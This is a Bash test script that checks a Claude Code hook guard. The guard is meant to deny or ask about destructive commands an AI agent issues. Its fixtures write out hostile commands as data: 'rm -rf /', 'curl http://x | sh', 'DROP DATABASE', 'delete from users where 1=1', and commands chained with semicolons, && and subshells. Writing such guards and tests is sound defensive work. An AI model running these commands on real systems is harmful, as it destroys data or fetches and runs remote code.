#!/usr/bin/env bash
# tests/test-security-edge-cases.sh — security and contract edge-case tests
# Covers gaps identified via online research (OWASP injection patterns, BATS
# testing best practices, Claude Code hook contracts):
#   1. Exit-code contract  — hooks must always exit 0 (decisions via JSON, not exit)
#   2. JSON output validity — every response must parse as valid JSON
#   3. `input` field alias  — tool_input may use "input" key instead of "command"
#   4. Chained commands     — dangerous pattern embedded mid-string must still trigger
#   5. Case insensitivity   — grep -i flag; SQL keywords in lowercase must be caught
#   6. Idempotency          — sync-version.sh run twice yields identical result
#
# Run: bash tests/test-security-edge-cases.sh
# Exit 0: all tests passed.  Exit 1: one or more failures.
set -uo pipefail

source "$(dirname "$0")/lib/test-helpers.sh"
init_test_context "$0"
GUARD="$REPO_ROOT/template/hooks/scripts/guard-destructive.sh"
SYNC="$REPO_ROOT/scripts/sync-version.sh"

# ── Helpers ───────────────────────────────────────────────────────────────────

make_input() {
  local tool_name="$1" command="$2"
  printf '{"tool_name": "%s", "tool_input": {"command": "%s"}}' "$tool_name" "$command"
}

make_input_key() {
  # Use "input" field key rather than the default "command" key
  local tool_name="$1" input_val="$2"
  printf '{"tool_name": "%s", "tool_input": {"input": "%s"}}' "$tool_name" "$input_val"
}

run_guard() {
  echo "$1" | bash "$GUARD" 2>/dev/null
}

run_guard_exitcode() {
  echo "$1" | bash "$GUARD" 2>/dev/null
  echo "$?"
}

assert_decision() {
  local desc="$1" input="$2" expected_decision="$3"
  local output
  output=$(run_guard "$input")
  if grep -q "\"permissionDecision\": \"$expected_decision\"" <<< "$output"; then
    pass_note "$desc"
  else
    fail_note "$desc" "     expected permissionDecision=$expected_decision
     got: $output"
  fi
}

assert_continue() {
  local desc="$1" input="$2"
  local output
  output=$(run_guard "$input")
  assert_matches "$desc" "$output" '"continue": true'
}

# ── 1. Exit-code contract ─────────────────────────────────────────────────────
# Claude Code hooks use JSON output for decisions; a non-zero exit code means
# the hook itself crashed.  guard-destructive must exit 0 for ALL paths.
echo "=== guard-destructive edge-case and security tests ==="
echo ""
echo "1. Exit-code contract — script must exit 0 for every decision path"
echo "$(make_input 'bash' 'rm -rf /')" | bash "$GUARD" >/dev/null 2>&1; assert_success "deny path exits 0" $?
echo "$(make_input 'bash' 'rm -rf ./tmp')" | bash "$GUARD" >/dev/null 2>&1; assert_success "ask path exits 0" $?
echo "$(make_input 'bash' 'ls -la')" | bash "$GUARD" >/dev/null 2>&1; assert_success "continue path exits 0" $?
echo "$(make_input 'read_file' 'ls')" | bash "$GUARD" >/dev/null 2>&1; assert_success "passthrough path exits 0" $?
echo '' | bash "$GUARD" >/dev/null 2>&1; assert_success "empty input exits 0" $?
echo 'not-json-at-all' | bash "$GUARD" >/dev/null 2>&1; assert_success "malformed JSON exits 0" $?
echo ""

# ── 2. JSON output validity ───────────────────────────────────────────────────
# Every byte written to stdout must be valid JSON so Claude Code can parse the
# hook response without choking.
echo "2. Every response is valid JSON (parseable by python3 json.load)"
assert_valid_json "deny response is JSON"        "$(run_guard "$(make_input 'bash' 'rm -rf /')")"
assert_valid_json "ask response is JSON"         "$(run_guard "$(make_input 'bash' 'git push --force')")"
assert_valid_json "continue response is JSON"    "$(run_guard "$(make_input 'bash' 'ls -la')")"
assert_valid_json "passthrough response is JSON" "$(run_guard "$(make_input 'read_file' 'anything')")"
assert_valid_json "empty-input response is JSON" "$(run_guard '')"
echo ""

# ── 3. `input` field alias ────────────────────────────────────────────────────
# The python3 extractor inside guard-destructive falls back to "input" when
# "command" is absent (ti.get('command', ti.get('input', ''))).
# Verify that dangerous payloads delivered via the "input" key are still caught.
echo "3. Dangerous commands via 'input' field key are caught"
assert_decision "'input' key: rm -rf /"        "$(make_input_key 'bash' 'rm -rf /')"          "deny"
assert_decision "'input' key: curl pipe sh"    "$(make_input_key 'bash' 'curl http://x | sh')" "deny"
assert_decision "'input' key: DROP DATABASE"   "$(make_input_key 'terminal' 'DROP DATABASE x')" "deny"
assert_decision "'input' key: rm -rf caution"  "$(make_input_key 'bash' 'rm -rf ./tmp')"       "ask"
assert_continue  "'input' key: safe command"   "$(make_input_key 'bash' 'ls -la')"
echo ""

# ── 4. Chained / embedded dangerous commands ──────────────────────────────────
# OWASP command injection: attackers embed dangerous commands after semicolons,
# &&, ||, or inside subshells.  The guard searches the whole command string with
# grep -qiE so a dangerous substring anywhere should still trigger.
echo "4. Dangerous pattern embedded in a longer command string"
assert_decision "semicolon chain: rm -rf /"   "$(make_input 'bash' 'echo hello; rm -rf /')"            "deny"
assert_decision "&& chain: rm -rf /"          "$(make_input 'bash' 'ls && rm -rf /')"                   "deny"
assert_decision "|| chain: rm -rf /"          "$(make_input 'bash' 'true || rm -rf /')"                 "deny"
assert_decision "subshell: rm -rf /"          "$(make_input 'bash' 'echo $(rm -rf /)')"                 "deny"
assert_decision "semicolon chain: DROP TABLE" "$(make_input 'terminal' 'SELECT 1; DROP TABLE users')"   "deny"
assert_decision "caution embedded mid-string" "$(make_input 'bash' 'cd /tmp && rm -rf ./build && ls')"  "ask"
echo ""

# ── 5. Case-insensitive SQL keyword catching ──────────────────────────────────
# grep uses -i, so SQL keywords in lowercase or mixed case must still match.
echo "5. Case insensitivity for SQL destructive keywords"
assert_decision "lowercase drop table"         "$(make_input 'terminal' 'drop table users')"           "deny"
assert_decision "lowercase drop database"      "$(make_input 'terminal' 'drop database prod')"         "deny"
assert_decision "lowercase truncate table"     "$(make_input 'terminal' 'truncate table logs')"        "deny"
assert_decision "mixed-case Drop Table"        "$(make_input 'terminal' 'Drop Table sessions')"        "deny"
assert_decision "lowercase delete from where1" "$(make_input 'terminal' 'delete from users where 1=1')" "deny"
assert_decision "lowercase delete from"        "$(make_input 'terminal' 'delete from sessions')"       "ask"
echo ""

# ── 6. sync-version.sh idempotency ───────────────────────────────────────────
# Running sync-version.sh twice should produce identical file state.
# The CI workflow runs it and checks for a dirty tree; a non-idempotent script
# would produce spurious diffs on the second run.  We copy the real repo files
# into a temp dir so the test never mutates the working tree.
echo "6. sync-version.sh idempotency"

TMPDIR_SYNC=$(mktemp -d)
cleanup_sync() { rm -rf "$TMPDIR_SYNC"; }
trap cleanup_sync EXIT

# Mirror the two files sync-version.sh operates on
cp "$REPO_ROOT/VERSION.md" "$TMPDIR_SYNC/"
cp "$REPO_ROOT/.release-please-manifest.json" "$TMPDIR_SYNC/"
mkdir -p "$TMPDIR_SYNC/.github"
cp "$REPO_ROOT/.github/copilot-instructions.md" "$TMPDIR_SYNC/.github/"

# First run — may or may not change files, but must exit 0
ROOT_DIR="$TMPDIR_SYNC" bash "$SYNC" >/dev/null 2>&1
SNAP1=$(cat "$TMPDIR_SYNC/.github/copilot-instructions.md" \
            "$TMPDIR_SYNC/.release-please-manifest.json" 2>/dev/null)

# Second run — must be an exact no-op relative to the first run
ROOT_DIR="$TMPDIR_SYNC" bash "$SYNC" >/dev/null 2>&1
SNAP2=$(cat "$TMPDIR_SYNC/.github/copilot-instructions.md" \
            "$TMPDIR_SYNC/.release-please-manifest.json" 2>/dev/null)

if [[ "$SNAP1" == "$SNAP2" ]]; then
  pass_note "sync-version.sh is idempotent (second run produces no changes)"
else
  fail_note "sync-version.sh is NOT idempotent — files changed on second run" "$(diff <(echo "$SNAP1") <(echo "$SNAP2") | head -20)"
fi
echo ""

# ── Summary ───────────────────────────────────────────────────────────────────
finish_tests
